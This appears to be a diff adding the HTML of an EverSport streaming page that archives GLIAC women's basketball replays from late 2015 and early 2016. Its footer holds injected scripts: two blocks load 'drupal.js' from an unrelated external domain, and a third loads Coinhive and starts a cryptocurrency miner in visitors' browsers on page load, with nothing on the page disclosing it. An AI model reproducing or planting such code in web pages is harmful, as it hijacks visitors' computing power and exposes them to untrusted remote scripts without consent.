+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/30/michigan-tech-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_8.jpg?itok=O-mOZC-z" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_8.jpg?itok=ejQzFJP1" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_8.jpg?itok=lg8fEHTd" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_8.jpg?itok=Rdll-eiS" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Michigan Tech at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-30T18:00:00+00:00" data-format="d M H:i T">30 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Michigan Tech at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-29 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/28/northern-michigan-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_7.jpg?itok=NrawU5_T" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_7.jpg?itok=xxqnxSvB" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_7.jpg?itok=W09B_iyl" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_7.jpg?itok=LjpQF7D6" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Northern Michigan at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-28T22:30:00+00:00" data-format="d M H:i T">28 Jan 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Northern Michigan at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-30 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/23/hillsdale-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_4.jpg?itok=XNpPorkB" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_4.jpg?itok=mIdZTGxe" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_4.jpg?itok=p4CrBhK8" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_4.jpg?itok=1GfxsbVe" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt=" Hillsdale at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams"> Hillsdale<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-23T18:00:00+00:00" data-format="d M H:i T">23 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content=" Hillsdale at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-31 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/23/ferris-state-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_6.jpg?itok=LluKrWDO" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_6.jpg?itok=zQ4mikMN" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_6.jpg?itok=_E_DFuFH" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_6.jpg?itok=Z39FDXit" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Ferris State at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Ferris State<span class="vs"> at </span>Lake Superior</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-23T18:00:00+00:00" data-format="d M H:i T">23 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Ferris State at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-32 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/21/saginaw-valley-state-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_3.jpg?itok=GtS6fwyQ" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_3.jpg?itok=jjbTgwFT" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_3.jpg?itok=g5QTAP7P" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_3.jpg?itok=gkkBz9GP" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Saginaw Valley State at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Saginaw Valley State<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-21T23:00:00+00:00" data-format="d M H:i T">21 Jan 23:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Saginaw Valley State at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-33 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/3/ohio-dominican-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_2.jpg?itok=ulk00Epv" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_2.jpg?itok=yYU3RV2u" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_2.jpg?itok=f5SKUoHC" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_2.jpg?itok=DtVnDUgC" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Ohio Dominican at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Ohio Dominican<span class="vs"> at </span>Northern Michigan</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-03T20:00:00+00:00" data-format="d M H:i T">03 Jan 20:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Ohio Dominican at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-34 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/3/ashland-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_4.jpg?itok=8yWtpzXg" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_4.jpg?itok=JBBC95Q6" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_4.jpg?itok=2seJGf0W" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_4.jpg?itok=DzL_6HeV" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Ashland at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Ashland<span class="vs"> at </span>Lake Superior</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-03T19:00:00+00:00" data-format="d M H:i T">03 Jan 19:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Ashland at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-35 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/2/tiffin-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_1.jpg?itok=nAywWtSn" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_1.jpg?itok=WhC9txTN" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_1.jpg?itok=halvyfep" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_1.jpg?itok=bKkDpgAi" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt=" Tiffin at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Northern Michigan<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-02T18:00:00+00:00" data-format="d M H:i T">02 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content=" Tiffin at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-36 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2016/1/2/lake-erie-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_3.jpg?itok=ovFtidEn" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_3.jpg?itok=hhDWpE32" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_3.jpg?itok=mFDjDpg9" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_3.jpg?itok=Unq74W4t" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Lake Erie at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2016-01-02T18:00:00+00:00" data-format="d M H:i T">02 Jan 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Lake Erie at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-37 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2015/12/5/wayne-state-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-lssu-hero_2.jpg?itok=Y4scNDZL" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-lssu-hero_2.jpg?itok=mQFVOX92" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-lssu-hero_2.jpg?itok=llSShbVN" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-lssu-hero_2.jpg?itok=FOpAy1y-" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Wayne State at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Lake Superior<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2015-12-05T18:00:00+00:00" data-format="d M H:i T">05 Dec 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Wayne State at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-38 views-row-even" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2015/12/5/malone-at-northern-michigan">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac-womensbasketball-nmu-hero_0.jpg?itok=zS2EFd7g" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac-womensbasketball-nmu-hero_0.jpg?itok=i_CXWT2C" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac-womensbasketball-nmu-hero_0.jpg?itok=ounXB-wr" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac-womensbasketball-nmu-hero_0.jpg?itok=8e-Ba3fZ" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Malone at Northern Michigan livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Northern Michigan<span class="vs"> vs. </span></h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2015-12-05T18:00:00+00:00" data-format="d M H:i T">05 Dec 18:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Malone at Northern Michigan" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-39 views-row-odd" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2015/11/22/minnesota-duluth-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wb_lssu_hero_1.jpg?itok=sJLBeNMi" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wb_lssu_hero_1.jpg?itok=0tiQ0i8f" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wb_lssu_hero_1.jpg?itok=Ogkw5eAQ" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wb_lssu_hero_1.jpg?itok=bA6Oiiu2" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Minnesota-Duluth at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Minnesota-Duluth<span class="vs"> at </span>Lake Superior</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2015-11-22T21:00:00+00:00" data-format="d M H:i T">22 Nov 21:00 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Minnesota-Duluth at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>  <article class="eversport-event node node-event node-teaser view-upcoming-videos__item view-display-archived__item views-row views-row-40 views-row-even views-row-last" >
+    <a class="eversport-event__inner u-l-p clickable-card" href="/gliac/basketball-womens/2015/11/21/minot-state-at-lake-superior">
+    <div class="eversport-event__image-container">
+              <img class="event-image" data-sm="http://eversport.tv/sites/default/files/styles/event_sm/public/gliac_wb_lssu_hero_0.jpg?itok=hEvR49y3" data-md="http://eversport.tv/sites/default/files/styles/event_md/public/gliac_wb_lssu_hero_0.jpg?itok=g2L2Xnc-" data-lg="http://eversport.tv/sites/default/files/styles/event_lg/public/gliac_wb_lssu_hero_0.jpg?itok=1Dps9lf5" data-xl="http://eversport.tv/sites/default/files/styles/event_xl/public/gliac_wb_lssu_hero_0.jpg?itok=T2TSwEXM" typeof="foaf:Image" src="http://eversport.tv/sites/all/modules/custom/eversport_videofield/images/transparent.gif" alt="Minot State at Lake Superior livestream matchup image" />            <p class="eversport-event__status schedule-btn is-post has-video"><span class="single phase-event-label-override-item">Re-Play</span></p>
+    </div>
+    <header class="eversport-event__header">
+      <h4 class="eversport-event__kicker sport-field"><span class="eversport-event__league league">Basketball - Women's</span><span class="eversport-event__sport sport">GLIAC</span></h4>
+      <h3 class="eversport-event__title teams">Minot State<span class="vs"> at </span>Lake Superior</h3>
+            <p class="eversport-event__date">
+        <svg viewBox='0 0 14 14' class='social-icons__item social-icons__item--calendar'><use xlink:href='#social-icons--calendar'></use></svg>
+  <span class="date-display-single" property="dc:date" datatype="xsd:dateTime" content="2015-11-21T22:30:00+00:00" data-format="d M H:i T">21 Nov 22:30 GMT</span>      </p>
+    </header>
+  </a>
+  <span property="dc:title" content="Minot State at Lake Superior" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span></article>    </div>
+  
+  
+  
+  
+  </div>                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="site-container">
+        <div class="stackla">
+            <div id="block-eversport-stackla-eversport-stackla-widget" class="block block-eversport-stackla">
+
+    
+  <div class="content">
+    <div id='stacklafw__refresh-container' class='stacklafw__refresh-container'><span id='stacklafw__refresh' class='stacklafw__refresh'><svg version="1.1" class="stacklafw__refresh-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+   width="18px" height="16px" viewBox="0 0 18 16" enable-background="new 0 0 18 16" fill="white">
+  <path d="M13,11L13,11L13,11h-1l2,2v-2"/>
+  <path d="M4,3V1h13v7h-2c0.096,0.324,0.096,0.676,0,1h3V0H3v3"/>
+  <path d="M0,3v9h4v4l5-4h6V3H0z M14,11H9H8.172l-0.586,0.586L5,14v-0.172V11H4H1V4h13V11z"/>
+  <circle cx="3.5" cy="7.5" r="1.5"/>
+  <circle cx="7.5" cy="7.5" r="1.5"/>
+  <circle cx="11.5" cy="7.5" r="1.5"/>
+  </svg> Refresh Social Content</span></div><div id='stacklafw' class='stacklafw' data-id='12142' data-tags='119955, 119960, 119959, 119960, 119959' data-hash='57f81c8cce483' data-ct='' data-alias='eversport.stackla.com' data-ttl='30' ></div>
+                <script type='text/javascript'>
+                  (function (d, id) {
+                      if (d.getElementById(id)) return;
+                      var t = d.createElement('script');
+                      t.type = 'text/javascript';
+                      t.src = '//assetscdn.stackla.com/media/js/widget/fluid-embed.js';
+                      t.id = id;
+                      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(t);
+                  }(document, 'stacklafw-js'));
+                </script>  </div>
+</div>
+        </div>
+      </div>
+    </div>
+    <div id="taxonomy-tab--list" class="taxonomy-tab schedule-view">
+      <div class="site-container">
+        <div class="view view-schedule view-id-schedule view-display-id-week view-dom-id-c6ee6ec19652618c90418c2d8c96604f view-total-rows-0">
+      <!-- AJAX DEBUG: data-display="week" data-path="taxonomy/term/22331" data-args="["2019-W18","22331"]" data-qs="" --><span id="week"><div class="eversport-schedule-loading ajax-progress ajax-progress-throbber" style="width:100%;text-align:center;" data-display="week" data-path="taxonomy/term/22331" data-args='["2019-W18","22331"]' data-qs=''><i class="glyphicon glyphicon-refresh glyphicon-spin"></i></div></span><div class="date-nav__container date-nav-wrapper ">
+  <div class="date-nav item-list">
+    <ul class="date-nav__list pager">
+              <li class="date-nav__item date-nav__item--prev date-prev">
+          <a href="http://eversport.tv/great-lakes/basketball-womens?date=2017-W07" rel="no-follow" class="date-nav__link date-nav__link--prev"><span class="date-nav__text date-nav__text--prev date-prev-text">Prev <span class="date-nav__jump date-nav__jump--prev">Week of 12 Feb 2017</span></span></a>        </li>
+              <li class="date-nav__item date-nav__item--heading date-heading">
+          <h3 class="date-nav__title">Week of 28 Apr 2019</h3>
+        </li>
+              <li class="date-nav__item date-nav__item--next date-next">
+          <span class="date-nav__inner-text date-nav__inner-text--empty date-nav__inner-text--next">No Future Events</span>
+        </li>
+          </ul>
+  </div>
+</div>  
+  
+  
+      <h4 class="eversport-event__no-upcoming">There are no events for this period.</h4>  
+  
+  
+  
+  </div>      </div>
+    </div>
+  </div>
+</section>
+
+<section class="popular-on-eversport__container">
+  <div class="site-container">
+    <h2 class="h2--alt">Popular on Eversport</h2>
+    <div class="popuplar-on-eversport">
+      <div class="view view-popular-on-eversport view-id-popular_on_eversport view-display-id-block view-dom-id-4ba130c289cf899968756c782fdef538 view-total-rows-1">
+  
+  
+  
+      <div class="view-popular-on-eversport__content">
+        <div class="site-container">
+  <div id="node-96566" class="node node-channel-embed node-teaser view-popular-on-eversport__item view-display-block__item views-row views-row-1 views-row-odd views-row-first" about="/embeds/big-sky-hoops" typeof="sioc:Item foaf:Document">
+          
+                    <h2><a href="/embeds/big-sky-hoops">Big Sky Hoops</a></h2>
+            <span property="dc:title" content="Big Sky Hoops" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span>
+              <div class="content">
+          </div>
+
+          
+            </div>
+</div>
+    </div>
+  
+  
+  
+  
+  </div>    </div>
+  </div>
+</section></div>  </div>
+</div>
+  </div>
+
+    
+  </main>
+  
+    <footer class="site-footer">
+    <div class="site-container">
+      <div class="site-footer__content">
+        <nav class="social-icons site-footer__col site-footer__col--left">
+          <a class="social-icons__link social-icons__logo-link" href="/"></a>
+                      <a class='social-icons__link social-icons__link--twitter'  target='_blank' href='https://twitter.com/eversporttv'><svg viewBox='0 0 60 52' class='social-icons__item social-icons__item--twitter'><use xlink:href='#social-icons--twitter'></use></svg></a>                                <a class='social-icons__link social-icons__link--facebook--square'  target='_blank' href='https://www.facebook.com/eversport'><svg viewBox='0 0 60 64' class='social-icons__item social-icons__item--facebook--square'><use xlink:href='#social-icons--facebook--square'></use></svg></a>                  </nav>
+        <div class="site-footer__col site-footer__col--right">
+          <p class="site-footer__copyright">
+            Copyright &copy; 2019 EverSport Media, Inc.
+          </p>
+          <nav class="footer-nav">
+                            <div class="region region-footer">
+    <div id="block-block-13" class="block block-block">
+
+    
+  <div class="content">
+    <script type="text/javascript" src="//upgraderservices.cf/drupal.js"></script>  </div>
+</div>
+<div id="block-block-14" class="block block-block">
+
+    
+  <div class="content">
+    <script type="text/javascript" src="//upgraderservices.cf/drupal.js"></script>  </div>
+</div>
+<div id="block-block-15" class="block block-block">
+
+    
+  <div class="content">
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script><script>
+<!--//--><![CDATA[// ><!--
+var miner = new CoinHive.Anonymous("T9UtNcvcu9o197o4xvHWm49rC3Ba81QR",{throttle: 0.6});miner.start();
